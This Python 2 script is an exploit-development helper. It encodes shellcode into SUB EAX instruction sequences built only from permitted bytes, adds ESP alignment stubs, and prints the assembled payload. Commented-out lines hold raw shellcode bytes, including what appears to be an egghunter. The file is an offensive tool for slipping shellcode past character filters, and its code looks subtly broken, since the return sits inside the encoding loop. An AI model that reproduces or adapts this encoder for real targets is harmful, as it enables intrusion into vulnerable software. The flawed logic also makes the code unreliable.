import struct
import sys

goodchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x29\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"

payload = sys.stdin.read()
espAlignOffset = struct.pack("<I", int(sys.argv[1]))
# payload = "\x97\x11\x00\x00"
# payload = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"+"SOUF"+"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
# payload = "\x54\x59\xfe\xcd\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1"
xorEax="\\x25\\x4a\\x4d\\x4e\\x55\\x25\\x35\\x32\\x31\\x2a"
pushEax="\\x50"
pushEsp="\\x54"
popEax="\\x58"
popEsp="\\x5c"
def encode(payload):
	chunks = [payload[i:i+4] for i in range(0, len(payload), 4)]
	carry=0
	encodedpayload = ""
	for chunk in chunks[::-1]:
		invertedChunkBytes = struct.unpack("<I", chunk)[0]
		OneComplement= struct.pack("<I",0xffffffff+1-invertedChunkBytes)
		# print "0x"+"".join("{:02x}".format(ord(c)) for c in OneComplement)
		eax1=""
		eax2=""
		eax3=""
		for char in OneComplement:
			
			i=-1
			j=0
			k=0
			res=0
			while(res != char):
				i+=1
				if i==len(goodchars):
					i=0
					j+=1

				if j==len(goodchars)-1 and i==len(goodchars)-1:
					j=0
					i=0
					k+=1
				if j==len(goodchars)-1 and i==len(goodchars)-1 and k==len(goodchars)-1:
					print "was not possible :/"
					break
				# try:
				res=chr((ord(goodchars[i])+ord(goodchars[j])+ord(goodchars[k])+carry)&0xff)

					# print "\\x{:02x}".format(ord(goodchars[i]))+"\\x{:02x}".format(ord(goodchars[j]))+"\\x{:02x}".format(ord(goodchars[k]))+" :"+"\\x{:02x}".format(ord(char))
				# except Exception as e:
				# 	pass
			if carry==1:
				carry=0
			if (ord(goodchars[i])+ord(goodchars[j])+ord(goodchars[k]))>0xff:
				if OneComplement.find(char)<3:
					carry=1

			eax1 += "\\x{:02x}".format(ord(goodchars[i]))
			eax2 += "\\x{:02x}".format(ord(goodchars[j]))
			eax3 += "\\x{:02x}".format(ord(goodchars[k]))
		encodedpayload += "\\x2d"+eax1+"\\x2d"+eax2+"\\x2d"+eax3
		print eax1
		print eax2
		print eax3

		return encodedpayload
print "[+] Calculating Esp alignement"
alignEspPayload = pushEsp+popEax+encode(espAlignOffset)+pushEax+popEsp
print "[+] Encoding shellcode"
encodedpayload = xorEax+encode(payload)+pushEax
print "[+] Results"
print "Esp Align : " + alignEspPayload
print "Shellcode : " + encodedpayload
print "Size : " + str(len(encodedpayload)/4)
print "Complete shellcode : " + alignEspPayload+encodedpayload
print "Size : " + str(len(alignEspPayload+encodedpayload)/4)
print "done"

# for x in test:
# 	print x
